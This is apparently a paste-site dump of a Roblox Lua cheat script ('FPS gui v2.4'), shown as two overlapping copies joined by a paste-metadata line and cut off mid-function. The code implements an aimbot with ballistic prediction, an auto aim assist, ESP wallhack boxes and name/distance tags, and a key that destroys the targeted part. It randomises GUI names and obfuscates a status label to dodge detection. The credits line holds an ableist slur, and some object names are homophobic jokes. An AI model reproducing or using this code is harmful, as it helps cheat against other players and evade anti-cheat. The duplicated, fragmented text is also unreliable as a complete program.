teambasedstatus.Text = ""Team Based: ""..tostring(TeamBased)
local espstatustext = teambasedstatus:Clone()
espstatustext.Name = getrandomstring()
espstatustext.Position = UDim2.new(0, 0,0.58, 0)
espstatustext.Text = ""Esp loop :""..tostring(autoesp)
espstatustext.Parent = Main
local hide = Instance.new(""TextButton"")
hide.Text = ""_""
hide.BackgroundTransparency = 1
hide.TextScaled = true
hide.TextWrapped = true
hide.Size = UDim2.new(0.1, 0,1, 0)
hide.Position = UDim2.new(0.9, 0,-0.15, 0)
hide.Name = getrandomstring()
hide.Parent = Move
Name.Name = getrandomstring()
Name.Parent = Move
Name.BackgroundColor3 = Color3.new(1, 1, 1)
Name.BackgroundTransparency = 1
Name.Size = UDim2.new(0.838, 0, 1, 0)
Name.Font = Enum.Font.Arial
Name.Text = ""FPS gui v""..ver
Name.TextColor3 = Color3.new(0, 0, 0)
Name.TextScaled = true
Name.TextSize = 14
Name.TextWrapped = true
Name.TextXAlignment = Enum.TextXAlignment.Left
local scr = Instance.new(""ScrollingFrame"")
scr.Size = Main.Size
scr.Position = Main.Position
scr.ScrollBarThickness = 0
scr.BackgroundTransparency = 1
scr.Name = getrandomstring()
Main.Size = UDim2.new(1, 0, 1, 0)
Main.Position = UDim2.new(0,0,0,0)
Main.Parent = scr
scr.Parent = Move
startpos = Main.Position
Move.Active = true

-- Scripts:
hided = false
hide.MouseButton1Click:Connect(function()
	if hided == false then
		hided = true
		Main:TweenPosition(UDim2.new(0, 0, -1.5, 0))
	else
		hided = false
		Main:TweenPosition(startpos)
	end
end)


aimbothiderbox.FocusLost:Connect(function()
	local numb = tonumber(aimbothiderbox.Text)
	if aimbothider == true then
		aimbothiderbox.TextColor3 =Color3.fromRGB(11, 255, 19)
	else
		aimbothiderbox.TextColor3 =Color3.fromRGB(255, 0, 0)
	end
	if numb ~= nil then
		aimbothiderspeed = numb
		if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
	else
		if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
	end
end)


local plrsforaim = {}


Move.Draggable = true
Gui.ResetOnSpawn = false
--Gui.Name = ""Chat""
Gui.DisplayOrder = 999
pcall(function()
if not game:GetService(""CoreGui"") then
	Gui.Parent = plrs.LocalPlayer.PlayerGui
else
	Gui.Parent = game:GetService(""CoreGui"")
end
end)
local espheadthing
do
local BillboardGui = Instance.new(""BillboardGui"")
local PName = Instance.new(""TextLabel"")
local Pdist = Instance.new(""TextLabel"")
local ImageLabel = Instance.new(""ImageLabel"")
local ImageLabel_2 = Instance.new(""ImageLabel"")
--Properties:
--BillboardGui.Parent = game.Workspace.Part
BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BillboardGui.AlwaysOnTop = true
BillboardGui.LightInfluence = 0
BillboardGui.Size = UDim2.new(0, 100, 0, 46)
BillboardGui.Name = ""headoverthing""
PName.Name = ""PName""
PName.Parent = BillboardGui
PName.BackgroundColor3 = espcolor
PName.BackgroundTransparency = 0.55000001192093
PName.BorderSizePixel = 0
PName.Size = UDim2.new(0, 100, 0, 23)
PName.Font = Enum.Font.SourceSans
PName.Text = ""urmom""
PName.TextColor3 = Color3.new(0, 0, 0)
PName.TextScaled = true
PName.TextSize = 14
PName.TextWrapped = true
st1.Text = uc(aimbotstatus)
Pdist.Name = ""Pdist""
Pdist.Parent = BillboardGui
Pdist.AnchorPoint = Vector2.new(0.5, 0)
Pdist.BackgroundColor3 = espcolor
Pdist.BackgroundTransparency = 0.55000001192093
Pdist.BorderSizePixel = 0
Pdist.Position = UDim2.new(0.5, 0, 0.5, 0)
Pdist.Size = UDim2.new(0, 70, 0, 23)
Pdist.Font = Enum.Font.SourceSans
Pdist.Text = ""666""
Pdist.TextColor3 = Color3.new(0, 0, 0)
Pdist.TextScaled = true
Pdist.TextSize = 14
Pdist.TextWrapped = true

ImageLabel.Parent = BillboardGui
ImageLabel.BackgroundColor3 = Color3.new(0.298039, 1, 0)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderColor3 = espcolor
ImageLabel.Position = UDim2.new(1, -15, 0.5, 0)
ImageLabel.Rotation = 180
ImageLabel.Size = UDim2.new(0, 15, 0, 23)
ImageLabel.Image = ""rbxassetid://2832171824""
ImageLabel.ImageColor3 = espcolor
ImageLabel.ImageTransparency = 0.55000001192093

ImageLabel_2.Parent = BillboardGui
ImageLabel_2.BackgroundColor3 = espcolor
ImageLabel_2.BackgroundTransparency = 1
ImageLabel_2.BorderColor3 = Color3.new(0.298039, 1, 0)
ImageLabel_2.Position = UDim2.new(0, 0, 0.5, 0)
ImageLabel_2.Rotation = 180
ImageLabel_2.Size = UDim2.new(0, 15, 0, 23)
ImageLabel_2.Image = ""rbxassetid://2832177613""
ImageLabel_2.ImageColor3 = espcolor
ImageLabel_2.ImageTransparency = 0.55000001192093
espheadthing = BillboardGui
end



f = {}
f.UpdateHeadUI = function(v)
	
		
			if v.Adornee and v.Adornee ~= nil then
				local destr = false
				if TeamBased then
					destr = true
					local plr = plrs:GetPlayerFromCharacter(v.Adornee.Parent)
					if plr and plr.Team and plr.Team.Name ~= lplr.Team.Name then
						destr = false
					end
				end
				if lightesp == true then
					v.Pdist.TextColor3 = Color3.new(1,1,1)
					v.PName.TextColor3 = Color3.new(1,1,1)
				else
					v.Pdist.TextColor3 = Color3.new(0,0,0)
					v.PName.TextColor3 = Color3.new(0,0,0)
				end
				local d = math.floor((cam.CFrame.p - v.Adornee.CFrame.p).magnitude)
				v.Pdist.Text = tostring(d)
				if d < 14 then
					v.Enabled = false
				else
					v.Enabled = true
				end
				v.StudsOffset = Vector3.new(0,.6+d/14,0)
				if destr then
					v:Destroy()
				end
			else
				v:Destroy()
			end
		
	
end
st1.Text = uc(aimbotstatus)
local espforlder
local partconverter = Instance.new(""Part"")
--local headsupdatelist = {}
st1_3.FocusLost:connect(function()
	if tonumber(st1_3.Text) then
		bspeed = tonumber(st1_3.Text)
	else
		
	end
end)
f.addesp = function()
	pcall(function()
	--print(""ESP ran"")
	if espforlder then
		espforlder:Destroy()
		espforlder = Instance.new(""Folder"")
		espforlder.Parent = game.Workspace.CurrentCamera
	else
		espforlder = Instance.new(""Folder"")
		espforlder.Parent = game.Workspace.CurrentCamera
	end
	for i, v in pairs(espforlder:GetChildren()) do
		v:Destroy()
	end
	for _, plr in pairs(plrs:GetChildren()) do
		if plr.Character and plr.Character.Humanoid.Health > 0 and plr.Name ~= lplr.Name then
			if TeamBased == true then
				
				if plr.Team.Name ~= plrs.LocalPlayer.Team.Name  then
					pcall(function()
					local e = espforlder:FindFirstChild(plr.Name)
					if not e then
						local fold = Instance.new(""Folder"", espforlder)
						fold.Name = plr.Name
						
						--partconverter.BrickColor = plr.Team.Color
						--local teamc = partconverter.Color
						for i, p in pairs(plr.Character:GetChildren()) do
							if p:IsA(""BasePart"") and p.Name ~= ""HumanoidRootPart"" then
								if charmsesp then
								local urmom = Instance.new(""BoxHandleAdornment"")
								urmom.ZIndex = 10
								urmom.AlwaysOnTop = true
								urmom.Color3 = espcolor
								urmom.Size = p.Size
								urmom.Adornee = p
								urmom.Name = tick().."" Ur mom has big gay""
								urmom.Transparency = wallhack_esp_transparency
								urmom.Parent = fold
								if p.Name == ""Head"" then
									local th = p:FindFirstChild(""headoverthing"")
									if not th then
										local ht = espheadthing:Clone()
										ht.PName.Text = p.Parent.Name
										ht.Adornee = p
										--table.insert(headsupdatelist, ht)
										delay(0, function()
											while wait(0.08) and plr and p do
												f.UpdateHeadUI(ht)
											end
										end)
										ht.Parent = p
									end
								end
								end
							end
						end
						plr.Character.Humanoid.Died:Connect(function()
							fold:Destroy()
						end)
						
					end
					end)
				end
			else
				local e = espforlder:FindFirstChild(plr.Name)
				if not e then
					local fold = Instance.new(""Folder"", espforlder)
						fold.Name = plr.Name
						
						--partconverter.BrickColor = plr.Team.Color
						--local teamc = Move.BackgroundColor3
						for i, p in pairs(plr.Character:GetChildren()) do
							if p:IsA(""BasePart"") and p.Name ~= ""HumanoidRootPart"" then
								pcall(function()
								if charmsesp then
								local urmom = Instance.new(""BoxHandleAdornment"")
								urmom.ZIndex = 10
								urmom.AlwaysOnTop = true
								urmom.Color3 = espcolor
								urmom.Size = p.Size
								urmom.Adornee = p
								urmom.Name = tick().."" Ur mom has big gay""
								urmom.Transparency = wallhack_esp_transparency
								urmom.Parent = fold
								end
								if p.Name == ""Head"" then
									local th = p:FindFirstChild(""headoverthing"")
									if not th then
										local ht = espheadthing:Clone()
										ht.PName.Text = p.Parent.Name
										ht.Adornee = p
										delay(0, function()
											while wait(0.08) and plr and p do
												f.UpdateHeadUI(ht)
											end
										end)
										--table.insert(headsupdatelist, ht)
										ht.Parent = p
									end
								end
								end)
							end
						end
						plr.Character.Humanoid.Died:Connect(function()
							fold:Destroy()
						end)
				end
			end
			
			
		end
	end
	end)
end

local uis = game:GetService(""UserInputService"")
local bringall = false
local hided2 = false
local upping = false
local downing = false
mouse.KeyDown:Connect(function(a)
	
	if a == ""n"" then
		--print(""worked1"")
		f.addesp()
	elseif a == gui_hide_button[2] and uis:IsKeyDown(gui_hide_button[1]) then
		if hided2 == false then
			hided2 = true
			autoesp =false
			if espforlder then
				espforlder:Destroy()
			end
			Gui.Enabled = false
		else
			Gui.Enabled = true
			hided2 = false
		end
			
	elseif a == """" then
		if aimbothider == false then
			aimbothider = true
			if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
		else
			
			aimbothider = false
			if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
		end
		if aimbothider == true then
			aimbothiderbox.TextColor3 =Color3.fromRGB(11, 255, 19)
		else
			aimbothiderbox.TextColor3 =Color3.fromRGB(255, 0, 0)
		end
	elseif a == ""l"" then
		if not uis:IsKeyDown(Enum.KeyCode.LeftControl) then
			if autoesp == false then
				autoesp = true
			else
				autoesp = false
			end
		else
			if lightesp == true then
				lightesp = false
			else
				lightesp = true
			end
		end
	elseif a == ""]"" then
		upping = true
		downing = false
	elseif a== ""["" then
		downing = true
		upping = false
	elseif a == Aim_Assist_Key[2] and uis:IsKeyDown(Aim_Assist_Key[1]) then
		if Aim_Assist == true then
			Aim_Assist = false
			--print(""disabled"")
		else
			Aim_Assist = true
		end
	end
	if a == ""j"" then
		if mouse.Target then
			mouse.Target:Destroy()
		end
	end
	if a == key then
		if switch == false then
			switch = true
		else
			switch = false
			if aimatpart ~= nil then
				aimatpart = nil
			end
		end
	elseif a == ""b"" and uis:IsKeyDown(Enum.KeyCode.LeftControl) and not uis:IsKeyDown(Enum.KeyCode.R) then
		if movementcounting then
			movementcounting = false
		else
			movementcounting = true
		end
	elseif a == teambasedswitch then
		if TeamBased == true then
			TeamBased = false
			teambasedstatus.Text = ""Team Based: ""..tostring(TeamBased)
		else
			TeamBased = true
			teambasedstatus.Text = ""Team Based: ""..tostring(TeamBased)
		end
	elseif a == ""b"" and uis:IsKeyDown(Enum.KeyCode.LeftControl) and uis:IsKeyDown(Enum.KeyCode.R) then
		ballisticsboost = 0
	elseif a == aimkey then
		if not aimatpart then
			local maxangle = math.rad(20)
			for i, plr in pairs(plrs:GetChildren()) do
				if plr.Name ~= lplr.Name and plr.Character and plr.Character.Head and plr.Character.Humanoid and plr.Character.Humanoid.Health > 1 then
					if TeamBased == true then
						if plr.Team.Name ~= lplr.Team.Name then
							local an = checkfov(plr.Character.Head)
							if an < maxangle then
								maxangle = an
								aimatpart = plr.Character.Head
							end
						end
					else
						local an = checkfov(plr.Character.Head)
							if an < maxangle then
								maxangle = an
								aimatpart = plr.Character.Head
							end
							--print(plr)
					end
					local old = aimatpart
					plr.Character.Humanoid.Died:Connect(function()
						--print(""died"")
						if aimatpart and aimatpart == old then
							aimatpart = nil
						end
					end)
					
				end
			end
		else
			aimatpart = nil
			canaimat = false
			delay(1.1, function()
				canaimat = true
			end)
		end
	end
end)

function getfovxyz (p0, p1, deg)
	local x1, y1, z1 = p0:ToOrientation()
	local cf = CFrame.new(p0.p, p1.p)
	local x2, y2, z2 = cf:ToOrientation()
	local d = math.deg
	if deg then
		return Vector3.new(d(x1-x2), d(y1-y2), d(z1-z2))
	else
		return Vector3.new((x1-x2), (y1-y2), (z1-z2))
	end
end


function aimat(part)
	if part then
		--print(part)
		local d = (cam.CFrame.p - part.CFrame.p).magnitude
		local calculatedrop
		local timetoaim = 0
		local pos2 = Vector3.new()
		if movementcounting == true then
			timetoaim = d/bspeed
			pos2 = part.Velocity * timetoaim
		end
		local minuseddrop = (ballisticsboost+50)/50
		if ballisticsboost ~= 0 then
			calculatedrop = d - (d/minuseddrop)
			
		else
			calculatedrop = 0
		end
		--print(calculatedrop)
		local addative = Vector3.new()
		if movementcounting then
			addative = pos2
		end
		local cf = CFrame.new(cam.CFrame.p, (addative + part.CFrame.p+ Vector3.new(0, calculatedrop, 0)))
		if aimbothider == true or Aim_Assist == true then
			cam.CFrame = cam.CFrame:Lerp(cf, aimbothiderspeed)
		else
			
			cam.CFrame = cf
		end
		--print(cf)
	end
end
function checkfov (part)
	local fov = getfovxyz(game.Workspace.CurrentCamera.CFrame, part.CFrame)
	local angle = math.abs(fov.X) + math.abs(fov.Y)
	return angle
end
pcall(function()
	delay(0, function()
		while wait(.32) do
			if Aim_Assist and not aimatpart and canaimat and lplr.Character and lplr.Character.Humanoid and lplr.Character.Humanoid.Health > 0 then
				for i, plr in pairs(plrs:GetChildren()) do
					
					
						local minangle = math.rad(5.5)
						local lastpart = nil
						local function gg(plr)
							pcall(function()
							if plr.Name ~= lplr.Name and plr.Character and plr.Character.Humanoid and plr.Character.Humanoid.Health > 0 and plr.Character.Head then
								local raycasted = false
								local cf1 = CFrame.new(cam.CFrame.p, plr.Character.Head.CFrame.p) * CFrame.new(0, 0, -4)
								local r1 = Ray.new(cf1.p, cf1.LookVector * 9000)
								local obj, pos = game.Workspace:FindPartOnRayWithIgnoreList(r1,  {lplr.Character.Head})
								local dist = (plr.Character.Head.CFrame.p- pos).magnitude
								if dist < 4 then
									raycasted = true
								end
								if raycasted == true then
									local an1 = getfovxyz(cam.CFrame, plr.Character.Head.CFrame)
									local an = abs(an1.X) + abs(an1.Y)
									if an < minangle then
										minangle = an
										lastpart = plr.Character.Head
									end
								end
							end
							end)
						end
						if TeamBased then
							if plr.Team.Name ~= lplr.Team.Name then
								gg(plr)
							end
						else
							gg(plr)
						end
						--print(math.deg(minangle))
						if lastpart then
							aimatpart = lastpart
							aimatpart.Parent.Humanoid.Died:Connect(function()
								if aimatpart == lastpart then
									aimatpart = nil
								end
							end)
						
					end
				end
			end
		end
	end)
end)
local oldheadpos
local lastaimapart
game:GetService(""RunService"").RenderStepped:Connect(function(dt)
	if uis:IsKeyDown(Enum.KeyCode.RightBracket) or uis:IsKeyDown(Enum.KeyCode.LeftBracket) then
		if upping then
			ballisticsboost = ballisticsboost + dt/1.9
		elseif downing then
			ballisticsboost = ballisticsboost - dt/1.9
		end
	end
	if movementcounting then
		st1_2.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
		st1_2.Text = ""Current ballistics: ""..tostring(math.floor(ballisticsboost*10)/10)
	else
		st1_2.TextColor3 = Color3.new(1,0,0)
	end
	espstatustext.Text = ""Esp loop :""..tostring(autoesp)
	if aimatpart and lplr.Character and lplr.Character.Head then
		if BetterDeathCount and lastaimapart and lastaimapart == aimatpart then
			local dist = (oldheadpos - aimatpart.CFrame.p).magnitude
			if dist > 40 then
				aimatpart = nil
			end
		end
		lastaimapart = aimatpart
		oldheadpos = lastaimapart.CFrame.p
		do 
			if aimatpart.Parent == plrs.LocalPlayer.Character then
				aimatpart = nil
			end
			aimat(aimatpart)
			pcall(function()
				if Aim_Assist == true then
					local cf1 = CFrame.new(cam.CFrame.p, aimatpart.CFrame.p) * CFrame.new(0, 0, -4)
					local r1 = Ray.new(cf1.p, cf1.LookVector * 1000)
					local obj, pos = game.Workspace:FindPartOnRayWithIgnoreList(r1,  {lplr.Character.Head})
					local dist = (aimatpart.CFrame.p- pos).magnitude
					if obj then
						--print(obj:GetFullName())
					end
					if not obj or dist > 6 then
						aimatpart = nil
						--print(""ooof"")
					end
					canaimat = false
					delay(.5, function()
						canaimat = true
					end)
				end
			end)
		end
		
		
		
	end
end)


delay(0, function()
	while wait(espupdatetime) do
		if autoesp == true then
			pcall(function()
			f.addesp()
			end)
		end
	end
end)
--warn(""loaded"")
end)"
f8vwJP4n,FPS,zdytor,Lua,Friday 5th of July 2024 01:18:35 PM CDT,"-----Credits to Lazy Autistic Devs.
-----Works on almost all FPS Games accept Phantom Forces works on CBRO, Strucid, ETC.
pcall(function()
local espcolor = Color3.fromRGB(140, 69, 102)
local wallhack_esp_transparency = .4
local gui_hide_button = {Enum.KeyCode.LeftControl, ""h""}
local plrs = game:GetService(""Players"")
local lplr = game:GetService(""Players"").LocalPlayer
local TeamBased = true ; local teambasedswitch = ""]""
local presskeytoaim = true; local aimkey = ""r""
aimbothider = false; aimbothiderspeed = .5
local Aim_Assist = false ; Aim_Assist_Key = {Enum.KeyCode.LeftControl, ""z""}
local espupdatetime = 5; autoesp = false; local charmsesp = true
local movementcounting = true




local mouselock = false
local canaimat = true
local lockaim = true; local lockangle = 5
local ver = ""2.4""
local cam = game.Workspace.CurrentCamera
local BetterDeathCount = true
local ballisticsboost = 0

local mouse = lplr:GetMouse()
local switch = false
local key = ""k""
local aimatpart = nil
local lightesp = false

local abs = math.abs

local Gui = Instance.new(""ScreenGui"")
local Move = Instance.new(""Frame"")
local Main = Instance.new(""Frame"")
local EspStatus = Instance.new(""TextLabel"")
local st1 = Instance.new(""TextLabel"")
local st1_2 = Instance.new(""TextLabel"")
local st1_3 = Instance.new(""TextBox"")
local Name = Instance.new(""TextLabel"")
--Properties:

Gui.Parent = plrs.LocalPlayer:WaitForChild(""PlayerGui"")


local aimbotstatus = {""qc"", ""qr"", ""qe"", ""qd"", ""qi"", ""qt"", ""qs"", ""dd"", ""sp"", ""ql"", ""qa"", ""qd"", ""qs""}
local gotstring = 0
local function getrandomstring()
	gotstring = gotstring+666
	local str = """"
	local randomstring = {""a"", ""b"", ""c"", ""d"", ""e"", ""f"", ""g"", ""h"", ""i"", ""g"", ""k"", ""l"", ""m"", ""o"", ""p"", ""q"", ""r"", ""s"", ""t"", ""u"", ""v"", ""w"", ""x"", ""y"", ""z"",
		 ""–∞"",""–±"",""–≤"",""–≥"",""–¥"",""–µ"",""—ë"",""–∂"",""–∑"",""–∏"",""–π"",""–∫"",""–ª"",""–º"",""–æ"",""–ø"",""—Ä"",""—Å"",""—Ç"",""—É"",""—Ñ"",""—Ö"",""—á"",""—â"",""—ä"",""—ã"",""—ä"",""—ç"",""—é"",""—è"", ""`"", ""$"", 
		""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"", }
	local counting123 = 0
	for i, v in ipairs(randomstring) do
		counting123 = i
	end
	do
		math.randomseed(tick()+gotstring)
		for i = 3, math.random(1,100) do
				math.randomseed(i+tick()+gotstring)
				
				local oneortwo = math.random(1,2)
				if oneortwo == 2 then
					math.randomseed(i+tick()+gotstring)
					str = str..""""..randomstring[math.random(1, counting123)]
				else
					math.randomseed(i+tick()+gotstring)
					str = str..""""..string.upper(randomstring[math.random(1, counting123)])
				end
			
		end
	end
	return str
end
local mousedown = false
local isonmovething = false
local mouseoffset = Vector2.new()
local mousedown = false
local bspeed = 3584
local aimbotoffset = {dd = "":"", sp = "" "", qa = ""a"", qb = ""b"",qc = ""c"", qd = ""d"", qe = ""e"", qf = ""f"", qg = ""g"" , qh = ""h"" , qi = ""i"", qj = ""j"", qk = ""k"", ql = ""l"", qm = ""m"", qn = ""n"", qo = ""o"", qp = ""p"", qq = ""q"", qr = ""r"", qs = ""s"", qt = ""t"", qu = ""u"", qv = ""w"", qx = ""x"", qy = ""y"", qz = ""z""}



Gui.Name = getrandomstring()

Move.Name = getrandomstring()
Move.Draggable = true
Move.Parent = Gui
Move.BackgroundColor3 = Color3.new(0.0431373, 1, 0.0745098)
Move.BackgroundTransparency = 0.40000000596046
Move.BorderSizePixel = 0
Move.Position = UDim2.new(0.5, 0,0.018, 0)
Move.Size = UDim2.new(0, 320, 0, 30)

Move.MouseEnter:Connect(function()
	
	isonmovething = true
	
end)
Move.MouseLeave:Connect(function()
	
	isonmovething = mousedown and true or false
end)
mouse.Button1Down:connect(function()
	mousedown = true
	mouseoffset = Move.AbsolutePosition - Vector2.new(mouse.X, mouse.Y)
end)
mouse.Button1Up:connect(function()
	mousedown = false
end)

mouse.Move:Connect(function()
	if isonmovething == true and mousedown then
		Move.Position = UDim2.new(0, mouseoffset.X + mouse.X, 0, mouseoffset.Y + mouse.Y)
	end
end)
local function uc (st)
	local ast = """"
	for i, v in ipairs(st) do
		local let = aimbotoffset[v]
		ast = ast..let
	end
	return ast
end

Main.Name = getrandomstring()
Main.Parent = Move
Main.BackgroundColor3 = Color3.new(0.176471, 0.176471, 0.176471)
Main.BackgroundTransparency = 0.69999998807907
Main.Position = UDim2.new(0, 0, 0.995670795, 0)
Main.Size = UDim2.new(1.0000006, 0, 11.2, 0)

st1.Name = getrandomstring()
st1.Parent = Main
st1.BackgroundColor3 = Color3.new(1, 1, 1)
st1.BackgroundTransparency = 1
st1.Position = UDim2.new(0, 0, 0, 0)
st1.Size = UDim2.new(1, 0, 0.161862016, 0)
st1.Font = Enum.Font.ArialBold
st1.Text = uc(aimbotstatus)
st1.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
st1.TextScaled = true
st1.TextSize = 14
st1.TextWrapped = true

st1_2.Name = getrandomstring()
st1_2.Parent = Main
st1_2.BackgroundColor3 = Color3.new(1, 1, 1)
st1_2.BackgroundTransparency = 1
st1_2.Position = UDim2.new(0, 0, 0.375590861, 0)
st1_2.Size = UDim2.new(0.999999881, 0, 0.161862016, 0)
st1_2.Font = Enum.Font.ArialBold
st1_2.TextXAlignment = Enum.TextXAlignment.Left
st1_2.Text = ""Current ballistics: 0""
st1_2.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
st1_2.TextScaled = true
st1_2.TextSize = 14
st1_2.TextWrapped = true

local aimbothiderbox = Instance.new(""TextBox"")
aimbothiderbox.Name = getrandomstring()
aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
aimbothiderbox.Size = UDim2.new(1, 0,0.162, 0)
aimbothiderbox.TextScaled = true
aimbothiderbox.TextColor3 =Color3.fromRGB(255, 0, 0)
aimbothiderbox.Position = UDim2.new(0, 0,0.853, 0)
aimbothiderbox.BackgroundTransparency = 1
aimbothiderbox.Parent = Main

st1_3.Name = getrandomstring()
st1_3.Parent = Main
st1_3.BackgroundColor3 = Color3.new(1, 1, 1)
st1_3.BackgroundTransparency = 1
st1_3.Position = UDim2.new(0, 0, 0.18558608, 0)
st1_3.Size = UDim2.new(0.999999881, 0, 0.161862016, 0)
st1_3.Font = Enum.Font.ArialBold
st1_3.Text = ""Bullet speed = 3584""
st1_3.TextColor3 = Color3.new(0.0431373, 1, 0.0745098)
st1_3.TextScaled = true
st1_3.TextSize = 14
st1_3.TextWrapped = true
local teambasedstatus = st1_3:Clone()
teambasedstatus.Parent = Main
teambasedstatus.TextScaled = true
teambasedstatus.Position = UDim2.new(0, 0,.7, 0)
teambasedstatus.Size = UDim2.new(1, 0,.1, 0)
teambasedstatus.Name = getrandomstring()
teambasedstatus.Text = ""Team Based: ""..tostring(TeamBased)
local espstatustext = teambasedstatus:Clone()
espstatustext.Name = getrandomstring()
espstatustext.Position = UDim2.new(0, 0,0.58, 0)
espstatustext.Text = ""Esp loop :""..tostring(autoesp)
espstatustext.Parent = Main
local hide = Instance.new(""TextButton"")
hide.Text = ""_""
hide.BackgroundTransparency = 1
hide.TextScaled = true
hide.TextWrapped = true
hide.Size = UDim2.new(0.1, 0,1, 0)
hide.Position = UDim2.new(0.9, 0,-0.15, 0)
hide.Name = getrandomstring()
hide.Parent = Move
Name.Name = getrandomstring()
Name.Parent = Move
Name.BackgroundColor3 = Color3.new(1, 1, 1)
Name.BackgroundTransparency = 1
Name.Size = UDim2.new(0.838, 0, 1, 0)
Name.Font = Enum.Font.Arial
Name.Text = ""FPS gui v""..ver
Name.TextColor3 = Color3.new(0, 0, 0)
Name.TextScaled = true
Name.TextSize = 14
Name.TextWrapped = true
Name.TextXAlignment = Enum.TextXAlignment.Left
local scr = Instance.new(""ScrollingFrame"")
scr.Size = Main.Size
scr.Position = Main.Position
scr.ScrollBarThickness = 0
scr.BackgroundTransparency = 1
scr.Name = getrandomstring()
Main.Size = UDim2.new(1, 0, 1, 0)
Main.Position = UDim2.new(0,0,0,0)
Main.Parent = scr
scr.Parent = Move
startpos = Main.Position
Move.Active = true

-- Scripts:
hided = false
hide.MouseButton1Click:Connect(function()
	if hided == false then
		hided = true
		Main:TweenPosition(UDim2.new(0, 0, -1.5, 0))
	else
		hided = false
		Main:TweenPosition(startpos)
	end
end)


aimbothiderbox.FocusLost:Connect(function()
	local numb = tonumber(aimbothiderbox.Text)
	if aimbothider == true then
		aimbothiderbox.TextColor3 =Color3.fromRGB(11, 255, 19)
	else
		aimbothiderbox.TextColor3 =Color3.fromRGB(255, 0, 0)
	end
	if numb ~= nil then
		aimbothiderspeed = numb
		if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
	else
		if aimbothider == true then
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" on""
		else
			aimbothiderbox.Text = ""Speed :""..tostring(aimbothiderspeed).."" off""
		end
	end
end)


local plrsforaim = {}


Move.Draggable = true
Gui.ResetOnSpawn = false
--Gui.Name = ""Chat""
Gui.DisplayOrder = 999
pcall(function()
if not game:GetService(""CoreGui"") then
	Gui.Parent = plrs.LocalPlayer.PlayerGui
else
	Gui.Parent = game:GetService(""CoreGui"")
end
end)
local espheadthing
do
local BillboardGui = Instance.new(""BillboardGui"")
local PName = Instance.new(""TextLabel"")
local Pdist = Instance.new(""TextLabel"")
local ImageLabel = Instance.new(""ImageLabel"")
local ImageLabel_2 = Instance.new(""ImageLabel"")
--Properties:
--BillboardGui.Parent = game.Workspace.Part
BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BillboardGui.AlwaysOnTop = true
BillboardGui.LightInfluence = 0
BillboardGui.Size = UDim2.new(0, 100, 0, 46)
BillboardGui.Name = ""headoverthing""
PName.Name = ""PName""
PName.Parent = BillboardGui
PName.BackgroundColor3 = espcolor
PName.BackgroundTransparency = 0.55000001192093
PName.BorderSizePixel = 0
PName.Size = UDim2.new(0, 100, 0, 23)
PName.Font = Enum.Font.SourceSans
PName.Text = ""urmom""
PName.TextColor3 = Color3.new(0, 0, 0)
PName.TextScaled = true
PName.TextSize = 14
PName.TextWrapped = true
st1.Text = uc(aimbotstatus)
Pdist.Name = ""Pdist""
Pdist.Parent = BillboardGui
Pdist.AnchorPoint = Vector2.new(0.5, 0)
Pdist.BackgroundColor3 = espcolor
Pdist.BackgroundTransparency = 0.55000001192093
Pdist.BorderSizePixel = 0
Pdist.Position = UDim2.new(0.5, 0, 0.5, 0)
Pdist.Size = UDim2.new(0, 70, 0, 23)
Pdist.Font = Enum.Font.SourceSans
Pdist.Text = ""666""
Pdist.TextColor3 = Color3.new(0, 0, 0)
Pdist.TextScaled = true
Pdist.TextSize = 14
Pdist.TextWrapped = true

ImageLabel.Parent = BillboardGui
ImageLabel.BackgroundColor3 = Color3.new(0.298039, 1, 0)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderColor3 = espcolor
ImageLabel.Position = UDim2.new(1, -15, 0.5, 0)
ImageLabel.Rotation = 180
ImageLabel.Size = UDim2.new(0, 15, 0, 23)
ImageLabel.Image = ""rbxassetid://2832171824""
ImageLabel.ImageColor3 = espcolor
ImageLabel.ImageTransparency = 0.55000001192093

ImageLabel_2.Parent = BillboardGui
ImageLabel_2.BackgroundColor3 = espcolor
ImageLabel_2.BackgroundTransparency = 1
ImageLabel_2.BorderColor3 = Color3.new(0.298039, 1, 0)
ImageLabel_2.Position = UDim2.new(0, 0, 0.5, 0)
ImageLabel_2.Rotation = 180
ImageLabel_2.Size = UDim2.new(0, 15, 0, 23)
ImageLabel_2.Image = ""rbxassetid://2832177613""
ImageLabel_2.ImageColor3 = espcolor
ImageLabel_2.ImageTransparency = 0.55000001192093
espheadthing = BillboardGui
end



f = {}
f.UpdateHeadUI = function(v)
	
		
			if v.Adornee and v.Adornee ~= nil then
				local destr = false
				if TeamBased then
					destr = true
					local plr = plrs:GetPlayerFromCharacter(v.Adornee.Parent)
					if plr and plr.Team and plr.Team.Name ~= lplr.Team.Name then
						destr = false
					end
				end
				if lightesp == true then
					v.Pdist.TextColor3 = Color3.new(1,1,1)
					v.PName.TextColor3 = Color3.new(1,1,1)
				else
					v.Pdist.TextColor3 = Color3.new(0,0,0)
					v.PName.TextColor3 = Color3.new(0,0,0)
				end
				local d = math.floor((cam.CFrame.p - v.Adornee.CFrame.p).magnitude)
				v.Pdist.Text = tostring(d)
				if d < 14 then
					v.Enabled = false
				else
					v.Enabled = true
				end
				v.StudsOffset = Vector3.new(0,.6+d/14,0)
				if destr then
